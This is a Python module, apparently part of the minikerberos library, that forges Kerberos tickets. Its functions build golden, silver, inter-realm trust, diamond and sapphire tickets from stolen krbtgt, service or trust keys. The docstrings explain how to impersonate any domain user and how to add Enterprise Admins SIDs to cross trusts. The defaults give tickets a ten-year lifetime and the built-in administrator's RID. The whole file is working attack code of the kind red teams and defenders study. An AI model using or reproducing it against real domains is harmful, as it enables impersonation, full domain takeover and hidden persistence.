
# Kerberos ticket forging.
#
# Everything here produces a ticket that a KDC never issued, by encrypting an
# EncTicketPart with a key that is supposed to be secret:
#
#   golden   - krbtgt key              -> a TGT for any user in the domain
#   silver   - a service account key   -> a service ticket for that one service
#   trust    - an inter-realm key      -> a referral TGT into another realm
#   diamond  - krbtgt key + valid creds-> a real TGT, decrypted and re-PAC'd
#   sapphire - krbtgt key + valid creds-> a forged TGT carrying a real PAC
#              lifted from the victim via S4U2self+U2U
#
# The offline kinds (golden/silver/trust) never touch the network. Diamond and
# sapphire need a working client, so they are async.

from __future__ import annotations
import datetime
import os
from typing import Dict, List

from minikerberos import logger
from minikerberos.common.ccache import CCACHE
from minikerberos.common.kirbi import Kirbi
from minikerberos.common.spn import KerberosSPN
from minikerberos.protocol.asn1_structs import (
	AD_IF_RELEVANT, EncTicketPart, Ticket, TicketFlags, krb5_pvno,
)
from minikerberos.protocol.constants import NAME_TYPE, EncryptionType
from minikerberos.protocol.encryption import (
	Enctype, Key, _enctype_table, string_to_key,
)
from minikerberos.protocol.external.pac import (
	PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE, PAC_UPN_DNS_INFO,
	PAC_ATTRIBUTES_INFO, PAC_REQUESTOR_INFO, PAC_SERVER_CHECKSUM,
	PAC_PRIVSVR_CHECKSUM,
)
from minikerberos.protocol.pacbuild import (
	DEFAULT_GOLDEN_GROUPS, build_attributes_info, build_client_info,
	build_logon_info, build_requestor_info, build_upn_dns_info, parse_pac,
	sid_split_rid, sign_pac,
)

# AD types ([MS-PAC] 2.1, RFC 4120 5.2.6)
AD_IF_RELEVANT_TYPE = 1
AD_WIN2K_PAC_TYPE = 128

# Key usage 2: the KDC encrypts EncTicketPart with the service's long-term key.
KDC_REP_TICKET_KEY_USAGE = 2

DEFAULT_DURATION_HOURS = 24 * 365 * 10

GOLDEN_FLAGS = ['forwardable', 'proxiable', 'renewable', 'initial', 'pre-authent']
SERVICE_FLAGS = ['forwardable', 'proxiable', 'renewable', 'pre-authent']

_KEYSIZE = {
	Enctype.AES256: 32,
	Enctype.AES128: 16,
	Enctype.RC4: 16,
}


def key_from_hex(keydata: str, etype: int = None) -> Key:
	"""A raw key in hex to a Key. The enctype is inferred from the length when
	not given: 32 hex chars is an NT hash (RC4), 64 is AES256."""
	raw = bytes.fromhex(keydata.strip())
	if etype is None:
		if len(raw) == 16:
			etype = Enctype.RC4
		elif len(raw) == 32:
			etype = Enctype.AES256
		else:
			raise Exception('Cannot infer enctype from a %d byte key, pass etype' % len(raw))
	return Key(etype, raw)


def key_from_password(password: str, principal: str, realm: str, etype: int = Enctype.AES256) -> Key:
	"""Derive a long-term key the way a KDC would, for callers that only have
	the service account's password."""
	if etype == Enctype.RC4:
		from unicrypto.hashlib import md4
		return Key(Enctype.RC4, md4(password.encode('utf-16-le')).digest())
	salt = (realm.upper() + principal).encode()
	return string_to_key(etype, password.encode(), salt)


def random_session_key(etype: int) -> Key:
	keysize = _KEYSIZE.get(etype)
	if keysize is None:
		raise Exception('No session key size known for enctype %s' % etype)
	return Key(etype, os.urandom(keysize))


class ForgedTicket:
	"""A forged ticket plus everything needed to use or store it."""

	def __init__(self, ticket: dict, enc_ticket_part: dict, session_key: Key,
					crealm: str, cname: dict, srealm: str, sname: dict):
		self.ticket = ticket
		self.enc_ticket_part = enc_ticket_part
		self.session_key = session_key
		self.crealm = crealm
		self.cname = cname
		self.srealm = srealm
		self.sname = sname

	def _as_ticketdata(self):
		"""Shape the forged ticket like a decrypted KDC reply so the existing
		Kirbi/CCACHE builders can consume it."""
		rep = {
			'crealm': self.crealm,
			'cname': self.cname,
			'ticket': self.ticket,
		}
		encpart = {
			'key': {
				'keytype': self.session_key.enctype,
				'keyvalue': self.session_key.contents,
			},
			'flags': self.enc_ticket_part['flags'],
			'authtime': self.enc_ticket_part['authtime'],
			'starttime': self.enc_ticket_part['starttime'],
			'endtime': self.enc_ticket_part['endtime'],
			'renew-till': self.enc_ticket_part['renew-till'],
			'srealm': self.srealm,
			'sname': self.sname,
		}
		return rep, encpart

	def to_kirbi(self) -> Kirbi:
		rep, encpart = self._as_ticketdata()
		return Kirbi.from_ticketdata(rep, encpart)

	def to_ccache(self) -> CCACHE:
		return CCACHE.from_kirbi(self.to_kirbi())

	def describe(self) -> str:
		return '%s@%s -> %s@%s (until %s)' % (
			'/'.join(self.cname['name-string']), self.crealm,
			'/'.join(self.sname['name-string']), self.srealm,
			self.enc_ticket_part['endtime'])


def build_pac(
		username: str,
		domain: str,
		domain_sid: str,
		user_id: int = 500,
		groups: List[int] = None,
		extra_sids: List[str] = None,
		authtime: datetime.datetime = None,
		extra_pac: bool = True,
		old_pac: bool = False) -> Dict[int, bytes]:
	"""The PAC buffers for a forged ticket, unsigned.

	extra_pac adds UPN_DNS_INFO; old_pac omits PAC_ATTRIBUTES_INFO and
	PAC_REQUESTOR, which a KDC patched for CVE-2021-42287 expects to see.
	"""
	if authtime is None:
		authtime = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
	if groups is None:
		groups = list(DEFAULT_GOLDEN_GROUPS)
	user_sid = '%s-%d' % (domain_sid, user_id)

	buffers = {}
	buffers[PAC_LOGON_INFO] = build_logon_info(
		username, domain, domain_sid,
		user_id = user_id,
		primary_group_id = groups[0] if len(groups) > 0 else 513,
		groups = groups,
		extra_sids = extra_sids,
		logon_time = authtime,
	)
	buffers[PAC_CLIENT_INFO_TYPE] = build_client_info(username, authtime)
	if extra_pac is True:
		buffers[PAC_UPN_DNS_INFO] = build_upn_dns_info(username, domain, user_sid)
	if old_pac is False:
		buffers[PAC_ATTRIBUTES_INFO] = build_attributes_info()
		buffers[PAC_REQUESTOR_INFO] = build_requestor_info(user_sid)
	return buffers


def forge_ticket(
		username: str,
		domain: str,
		service_key: Key,
		sname: List[str] = None,
		kdc_key: Key = None,
		crealm: str = None,
		srealm: str = None,
		pac_buffers: Dict[int, bytes] = None,
		session_key: Key = None,
		flags: List[str] = None,
		duration_hours: int = DEFAULT_DURATION_HOURS,
		authtime: datetime.datetime = None,
		kvno: int = 2,
		sname_type: int = None,
		cname_type: int = NAME_TYPE.PRINCIPAL.value) -> ForgedTicket:
	"""Encrypt an EncTicketPart under service_key and wrap it in a Ticket.

	This is the one place a ticket actually gets built; golden/silver/trust and
	the online kinds all funnel through here with different keys and snames.

	service_key encrypts the ticket and signs the PAC's server signature.
	kdc_key signs the KDC signature and defaults to service_key - which is what
	a silver ticket has to do, having no krbtgt key to sign with.
	"""
	domain = domain.upper()
	if crealm is None:
		crealm = domain
	if srealm is None:
		srealm = domain
	if kdc_key is None:
		kdc_key = service_key
	if sname is None:
		sname = ['krbtgt', domain]
	if sname_type is None:
		sname_type = NAME_TYPE.SRV_INST.value if sname[0].lower() == 'krbtgt' else NAME_TYPE.PRINCIPAL.value
	if flags is None:
		flags = GOLDEN_FLAGS if sname[0].lower() == 'krbtgt' else SERVICE_FLAGS
	if authtime is None:
		authtime = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
	if session_key is None:
		session_key = random_session_key(service_key.enctype)

	endtime = authtime + datetime.timedelta(hours = duration_hours)

	cname = {'name-type': cname_type, 'name-string': [username]}
	sname_dict = {'name-type': sname_type, 'name-string': list(sname)}

	enc_ticket_part = {
		'flags': TicketFlags(set(flags)),
		'key': {'keytype': session_key.enctype, 'keyvalue': session_key.contents},
		'crealm': crealm,
		'cname': cname,
		'transited': {'tr-type': 0, 'contents': b''},
		'authtime': authtime,
		'starttime': authtime,
		'endtime': endtime,
		'renew-till': endtime,
	}

	if pac_buffers is not None:
		pac = sign_pac(pac_buffers, service_key, kdc_key)
		enc_ticket_part['authorization-data'] = [{
			'ad-type': AD_IF_RELEVANT_TYPE,
			'ad-data': AD_IF_RELEVANT([{
				'ad-type': AD_WIN2K_PAC_TYPE,
				'ad-data': pac,
			}]).dump(),
		}]

	cipher = _enctype_table[service_key.enctype]
	encrypted = cipher.encrypt(
		service_key, KDC_REP_TICKET_KEY_USAGE, EncTicketPart(enc_ticket_part).dump(), None)

	ticket = {
		'tkt-vno': krb5_pvno,
		'realm': srealm,
		'sname': sname_dict,
		'enc-part': {
			'etype': service_key.enctype,
			'kvno': kvno,
			'cipher': encrypted,
		},
	}

	return ForgedTicket(
		ticket, enc_ticket_part, session_key, crealm, cname, srealm, sname_dict)


def golden_ticket(
		username: str,
		domain: str,
		domain_sid: str,
		krbtgt_key: Key,
		user_id: int = 500,
		groups: List[int] = None,
		extra_sids: List[str] = None,
		duration_hours: int = DEFAULT_DURATION_HOURS,
		extra_pac: bool = True,
		old_pac: bool = False,
		with_pac: bool = True,
		**kwargs) -> ForgedTicket:
	"""A TGT for any principal in the domain, signed with the krbtgt key."""
	domain = domain.upper()
	authtime = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
	pac_buffers = None
	if with_pac is True:
		pac_buffers = build_pac(
			username, domain, domain_sid,
			user_id = user_id, groups = groups, extra_sids = extra_sids,
			authtime = authtime, extra_pac = extra_pac, old_pac = old_pac)

	return forge_ticket(
		username, domain, krbtgt_key,
		sname = ['krbtgt', domain],
		pac_buffers = pac_buffers,
		duration_hours = duration_hours,
		authtime = authtime,
		**kwargs)


def silver_ticket(
		username: str,
		domain: str,
		domain_sid: str,
		spn: str,
		service_key: Key,
		user_id: int = 500,
		groups: List[int] = None,
		extra_sids: List[str] = None,
		duration_hours: int = DEFAULT_DURATION_HOURS,
		extra_pac: bool = True,
		old_pac: bool = False,
		with_pac: bool = True,
		**kwargs) -> ForgedTicket:
	"""A service ticket for one SPN, signed with that service account's key.

	Both PAC signatures use the service key: without the krbtgt key there is no
	way to produce a valid KDC signature. A service that forwards the PAC to a
	DC for validation will reject this ticket.
	"""
	domain = domain.upper()
	authtime = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
	sname = spn.split('/')
	if len(sname) == 1:
		sname = [sname[0], domain.lower()]

	pac_buffers = None
	if with_pac is True:
		pac_buffers = build_pac(
			username, domain, domain_sid,
			user_id = user_id, groups = groups, extra_sids = extra_sids,
			authtime = authtime, extra_pac = extra_pac, old_pac = old_pac)

	return forge_ticket(
		username, domain, service_key,
		sname = sname,
		pac_buffers = pac_buffers,
		duration_hours = duration_hours,
		authtime = authtime,
		**kwargs)


def trust_ticket(
		username: str,
		domain: str,
		domain_sid: str,
		target_domain: str,
		trust_key: Key,
		user_id: int = 500,
		groups: List[int] = None,
		extra_sids: List[str] = None,
		duration_hours: int = DEFAULT_DURATION_HOURS,
		extra_pac: bool = True,
		old_pac: bool = False,
		**kwargs) -> ForgedTicket:
	"""An inter-realm referral TGT (krbtgt/TARGET@SOURCE) signed with the trust
	key shared between the two domains.

	Present it to the target realm's KDC to get service tickets there. To cross
	into the target as a privileged principal, put the target's Enterprise
	Admins SID in extra_sids - the target KDC honours extra SIDs that its own
	SID-filtering policy does not strip.
	"""
	domain = domain.upper()
	target_domain = target_domain.upper()
	authtime = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)

	pac_buffers = build_pac(
		username, domain, domain_sid,
		user_id = user_id, groups = groups, extra_sids = extra_sids,
		authtime = authtime, extra_pac = extra_pac, old_pac = old_pac)

	return forge_ticket(
		username, domain, trust_key,
		sname = ['krbtgt', target_domain],
		crealm = domain,
		srealm = domain,
		pac_buffers = pac_buffers,
		flags = ['forwardable', 'proxiable', 'renewable', 'pre-authent'],
		duration_hours = duration_hours,
		authtime = authtime,
		**kwargs)


def extract_pac(enc_ticket_part: dict) -> Dict[int, bytes]:
	"""Pull the PAC buffers out of a decrypted EncTicketPart."""
	authdata = enc_ticket_part.get('authorization-data')
	if not authdata:
		raise Exception('Ticket carries no authorization-data, so no PAC')
	for ad in authdata:
		if ad['ad-type'] != AD_IF_RELEVANT_TYPE:
			continue
		for inner in AD_IF_RELEVANT.load(ad['ad-data']).native:
			if inner['ad-type'] == AD_WIN2K_PAC_TYPE:
				return parse_pac(inner['ad-data'])
	raise Exception('No PAC found in the ticket authorization-data')


def repac_ticket(
		enc_ticket_part: dict,
		ticket: dict,
		service_key: Key,
		kdc_key: Key = None,
		pac_buffers: Dict[int, bytes] = None,
		mutate_pac = None) -> ForgedTicket:
	"""Re-sign and re-encrypt an existing (decrypted) ticket.

	Used by the diamond path: a genuine ticket keeps its times, flags and
	session key, and only the PAC is swapped out.
	"""
	if kdc_key is None:
		kdc_key = service_key
	if pac_buffers is None:
		pac_buffers = extract_pac(enc_ticket_part)
	if mutate_pac is not None:
		pac_buffers = mutate_pac(pac_buffers)

	enc_ticket_part = dict(enc_ticket_part)
	pac = sign_pac(pac_buffers, service_key, kdc_key)
	enc_ticket_part['authorization-data'] = [{
		'ad-type': AD_IF_RELEVANT_TYPE,
		'ad-data': AD_IF_RELEVANT([{
			'ad-type': AD_WIN2K_PAC_TYPE,
			'ad-data': pac,
		}]).dump(),
	}]

	session_key = Key(
		enc_ticket_part['key']['keytype'], enc_ticket_part['key']['keyvalue'])

	cipher = _enctype_table[service_key.enctype]
	encrypted = cipher.encrypt(
		service_key, KDC_REP_TICKET_KEY_USAGE, EncTicketPart(enc_ticket_part).dump(), None)

	new_ticket = {
		'tkt-vno': krb5_pvno,
		'realm': ticket['realm'],
		'sname': ticket['sname'],
		'enc-part': {
			'etype': service_key.enctype,
			'kvno': ticket['enc-part'].get('kvno', 2),
			'cipher': encrypted,
		},
	}

	return ForgedTicket(
		new_ticket, enc_ticket_part, session_key,
		enc_ticket_part['crealm'], enc_ticket_part['cname'],
		ticket['realm'], ticket['sname'])


async def diamond_ticket(
		client,
		krbtgt_key: Key,
		username: str = None,
		domain: str = None,
		domain_sid: str = None,
		user_id: int = None,
		groups: List[int] = None,
		extra_sids: List[str] = None,
		extra_pac: bool = True,
		old_pac: bool = False) -> ForgedTicket:
	"""Request a real TGT with valid credentials, decrypt it with the krbtgt
	key, replace its PAC and re-encrypt it.

	The result is far closer to a KDC-issued ticket than a golden one: real
	times, real flags, real ticket structure, and the KDC has a matching record
	of having issued a TGT to this account.

	client is a connected AIOKerberosClient.
	"""
	logger.debug('[diamond] Requesting a real TGT to use as the template')
	await client.get_TGT()

	tgt = client.kerberos_TGT
	cipher = _enctype_table[int(tgt['ticket']['enc-part']['etype'])]
	if cipher.enctype != krbtgt_key.enctype:
		raise Exception(
			'The TGT is encrypted with enctype %s but the supplied krbtgt key is %s. '
			'Supply the matching key, or request the TGT with a matching etype.'
			% (cipher.enctype, krbtgt_key.enctype))

	decrypted = cipher.decrypt(krbtgt_key, KDC_REP_TICKET_KEY_USAGE, tgt['ticket']['enc-part']['cipher'])
	enc_ticket_part = EncTicketPart.load(decrypted).native
	logger.debug('[diamond] Decrypted the real TGT, rebuilding its PAC')

	if username is None:
		username = enc_ticket_part['cname']['name-string'][0]
	if domain is None:
		domain = enc_ticket_part['crealm']

	pac_buffers = None
	if domain_sid is not None:
		if user_id is None:
			user_id = 500
		pac_buffers = build_pac(
			username, domain, domain_sid,
			user_id = user_id, groups = groups, extra_sids = extra_sids,
			authtime = enc_ticket_part['authtime'],
			extra_pac = extra_pac, old_pac = old_pac)

	return repac_ticket(
		enc_ticket_part, tgt['ticket'], krbtgt_key, krbtgt_key,
		pac_buffers = pac_buffers)


async def sapphire_ticket(
		client,
		krbtgt_key: Key,
		user_to_impersonate,
		domain: str = None,
		duration_hours: int = DEFAULT_DURATION_HOURS) -> ForgedTicket:
	"""Forge a TGT carrying a PAC that the KDC itself produced for the victim.

	S4U2self+U2U asks the KDC for a service ticket for the impersonated user,
	encrypted in our own TGT's session key, so we can read the victim's real
	PAC - correct groups, correct SIDs, no guesswork about the domain SID.
	That PAC is then re-signed with the krbtgt key into a fresh TGT.

	client is a connected AIOKerberosClient. user_to_impersonate is a
	KerberosSPN / KerberosTarget naming the victim.
	"""
	logger.debug('[sapphire] Asking the KDC for the victim PAC via S4U2self+U2U')
	_, _, _, victim_enc_ticket_part = await client.S4U2self_U2U(user_to_impersonate)

	pac_buffers = extract_pac(victim_enc_ticket_part)
	logger.debug('[sapphire] Lifted a real PAC with %d buffers' % len(pac_buffers))

	username = victim_enc_ticket_part['cname']['name-string'][0]
	crealm = victim_enc_ticket_part['crealm']
	if domain is None:
		domain = crealm

	return forge_ticket(
		username, domain.upper(), krbtgt_key,
		sname = ['krbtgt', domain.upper()],
		crealm = crealm,
		pac_buffers = pac_buffers,
		duration_hours = duration_hours)
